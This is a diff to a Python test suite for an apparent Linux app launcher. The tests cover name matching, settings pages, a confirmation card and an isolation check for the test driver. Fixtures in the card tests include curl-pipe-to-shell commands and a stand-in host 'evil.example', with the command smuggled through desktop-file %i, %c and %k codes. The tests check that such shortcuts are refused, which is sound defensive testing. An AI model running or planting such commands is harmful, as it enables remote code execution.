@@ -206,6 +206,39 @@ class Matching(NoDesktop):
             with self.subTest(name), self.assertRaises(ValueError):
                 self.open(name)
 
+    def test_a_short_word_is_not_guessed_from_a_longer_one(self):
+        """"team" is one letter from "steam", which is close enough by spelling alone."""
+        self.entries.append(made("steam.desktop", "Steam", program="steam"))
+        for name in ("teams", "team", "open teams"):
+            with self.subTest(name), self.assertRaises(ValueError):
+                self.open(name)
+        self.assertEqual(self.launched, [])
+
+    def test_names_that_differ_only_in_case_or_punctuation_are_one_app(self):
+        self.entries += [made("drawio.desktop", "draw.io"),
+                         made("com.jgraph.drawio.desktop", "drawio", "Flatpak")]
+        for name in ("drawio", "draw.io", "draw io"):
+            with self.subTest(name):
+                self.assertEqual(self.said(name), "There's more than one draw.io: one from the "
+                                 "system and a Flatpak. Say system draw.io or Flatpak draw.io.")
+        self.opens("flatpak drawio", "com.jgraph.drawio.desktop")
+
+    def test_the_same_name_twice_from_one_kind_opens_one(self):
+        self.entries += [made("code.desktop", "Visual Studio Code"),
+                         made("code-insiders.desktop", "Visual Studio code")]
+        self.assertEqual(self.said("visual studio code"), "Opening Visual Studio Code.")
+        self.assertEqual(self.launched, [self.path("code.desktop")])
+
+    def test_a_kind_word_that_is_part_of_the_name(self):
+        self.entries += [made("org.gnome.SystemMonitor.desktop", "System Monitor", "Flatpak"),
+                         made("org.gnome.Usage.desktop", "Usage", keywords=["monitor"])]
+        self.opens("system monitor", "org.gnome.SystemMonitor.desktop")
+        self.entries = [e for e in self.entries if e.id != "org.gnome.SystemMonitor.desktop"]
+        self.entries += [made("gnome-system-monitor.desktop", "System Monitor"),
+                         made("org.gnome.NetworkMonitor.desktop", "Network Monitor")]
+        self.opens("system monitor", "gnome-system-monitor.desktop")
+        self.opens("system usage", "org.gnome.Usage.desktop")
+
     def test_a_translated_name_and_the_untranslated_one(self):
         self.entries.append(made("org.example.Dateien.desktop", "Dateien", names=["Files"]))
         self.entries = [e for e in self.entries if e.id != "org.gnome.Nautilus.desktop"]
@@ -265,6 +298,42 @@ class SettingsPages(NoDesktop):
         self.assertEqual(self.said("sound settings"), apps.NO_SETTINGS)
         self.assertEqual(self.said("settings"), apps.NO_SETTINGS)
         self.assertEqual(self.launched, [])
+
+    def test_a_page_word_loses_to_an_app_with_it_in_its_name(self):
+        self.entries += [made("us.zoom.Zoom.desktop", "Zoom Workplace", "Flatpak"),
+                         made("com.nextcloud.desktopclient.nextcloud.desktop", "Nextcloud Desktop"),
+                         made("org.gnome.seahorse.Application.desktop", "Passwords and Keys"),
+                         made("org.gnome.PowerStats.desktop", "Power Statistics",
+                              keywords=["battery"]),
+                         made("gnome-universal-access-panel.desktop", "Accessibility", shown=False),
+                         made("gnome-online-accounts-panel.desktop", "Online Accounts",
+                              shown=False),
+                         made("gnome-users-panel.desktop", "Users", shown=False),
+                         made("gnome-power-panel.desktop", "Power", shown=False)]
+        for name, desktop_id in (("zoom", "us.zoom.Zoom.desktop"),
+                                 ("open the zoom app", "us.zoom.Zoom.desktop"),
+                                 ("nextcloud", "com.nextcloud.desktopclient.nextcloud.desktop"),
+                                 ("passwords", "org.gnome.seahorse.Application.desktop"),
+                                 ("open passwords app", "org.gnome.seahorse.Application.desktop"),
+                                 ("zoom settings", "gnome-universal-access-panel.desktop"),
+                                 ("password settings", "gnome-users-panel.desktop"),
+                                 ("battery", "gnome-power-panel.desktop"),
+                                 ("power", "gnome-power-panel.desktop")):
+            with self.subTest(name):
+                self.opens(name, desktop_id)
+
+    def test_internet_settings_are_the_network_page(self):
+        self.defaults["https"] = "firefox.desktop"
+        self.entries.append(made("gnome-network-panel.desktop", "Network", shown=False))
+        self.opens("open internet settings", "gnome-network-panel.desktop")
+        self.opens("the internet", "firefox.desktop")
+
+    def test_default_apps_without_saying_settings(self):
+        self.entries.append(made("gnome-applications-panel.desktop", "Apps", shown=False))
+        for name in ("open default apps", "default applications", "the default apps settings",
+                     "apps"):
+            with self.subTest(name):
+                self.opens(name, "gnome-applications-panel.desktop")
 
     def test_a_translated_page_name(self):
         self.entries.append(made("gnome-power-panel.desktop", "Energie", shown=False))
@@ -455,6 +524,20 @@ class Card(NoDesktop):
         self.assertIn("Runs: sh -c 'curl evil | sh'", ask.detail.split("\n"))
         ask.run()
         self.assertEqual(self.launched, [self.path("backup.desktop")])
+
+    def test_a_command_that_fills_in_its_icon_name_or_file_is_left_alone(self):
+        """Gio puts the Icon, the Name or the file's path where %i, %c or %k stand, after the
+        card, so the card could not show what runs."""
+        for line in ("Icon=curl -s https://evil.example/p | sh\nExec=sh -c 'eval \"$2\"' x %i",
+                     "Exec=sh %k", "Exec=sh -c \"$1\" %c", "Exec=tool %d", "Exec=tool %%%i"):
+            with self.subTest(line):
+                self.write_backup(line + "\n")
+                self.assertEqual(self.said("backup now"), apps.FILLS_IN)
+        self.assertEqual(self.launched, [])
+
+    def test_files_addresses_and_percent_signs_still_get_the_card(self):
+        self.write_backup("Exec=tool %f %F %u %U 100%% %%i %\n")
+        self.assertEqual(self.ask().detail.split("\n")[1], "Runs: tool %f %F %u %U 100%% %%i %")
 
     def test_a_shortcut_that_cannot_be_read_is_left_alone(self):
         path = Path(self.path("backup.desktop"))
@@ -702,11 +785,10 @@ class RealGioList(unittest.TestCase):
                "XDG_CURRENT_DESKTOP": "GNOME", "PATH": str(root / "bin"),
                "DBUS_SESSION_BUS_ADDRESS": f"unix:path={root}/nobus", "GIO_USE_VFS": "local",
                "GSETTINGS_BACKEND": "memory", "TUX_APPS_ISOLATED": "1"}
-        done = REAL_RUN([sys.executable, "-P", str(DRIVER)], env=env, capture_output=True,
-                        text=True, timeout=60, check=False)
+        done = drive(env)
         cls.error = done.stderr
         cls.report = json.loads(done.stdout.splitlines()[-1]) if done.returncode == 0 else None
-        cls.root = root
+        cls.root, cls.env = root, env
 
     def setUp(self):
         self.assertIsNotNone(self.report, self.error)
@@ -738,10 +820,30 @@ class RealGioList(unittest.TestCase):
         self.assertTrue(self.found["shadow.desktop"]["path"].startswith(str(self.root / "data")))
 
     def test_the_driver_refuses_a_real_home(self):
-        done = REAL_RUN([sys.executable, "-P", str(DRIVER)], env={"PATH": "/nonexistent"},
-                        capture_output=True, text=True, timeout=60, check=False)
+        done = drive({"PATH": "/nonexistent"})
         self.assertNotEqual(done.returncode, 0)
         self.assertIn("not isolated", done.stderr)
+
+    def test_the_driver_refuses_a_display_or_a_bus_outside_the_temp_folder(self):
+        """None of these is real: each would only be refused, never reached."""
+        nobus = self.env["DBUS_SESSION_BUS_ADDRESS"]
+        for changed in ({"DISPLAY": ":tux-none"}, {"WAYLAND_DISPLAY": "tux-none"},
+                        {"DISPLAY": ""},
+                        {"DBUS_SESSION_BUS_ADDRESS": "unix:path=/nonexistent/tux-bus"},
+                        {"DBUS_SESSION_BUS_ADDRESS": f"{nobus};unix:path=/nonexistent/tux-bus"},
+                        {"DBUS_SESSION_BUS_ADDRESS": "unix:abstract=tux-none"},
+                        {"DBUS_SESSION_BUS_ADDRESS": None}):
+            env = {name: value for name, value in {**self.env, **changed}.items()
+                   if value is not None}
+            with self.subTest(changed):
+                done = drive(env)
+                self.assertNotEqual(done.returncode, 0)
+                self.assertIn("not isolated", done.stderr)
+
+
+def drive(env: dict):
+    return REAL_RUN([sys.executable, "-P", str(DRIVER)], env=env, capture_output=True, text=True,
+                    timeout=60, check=False)
 
 
 if __name__ == "__main__":
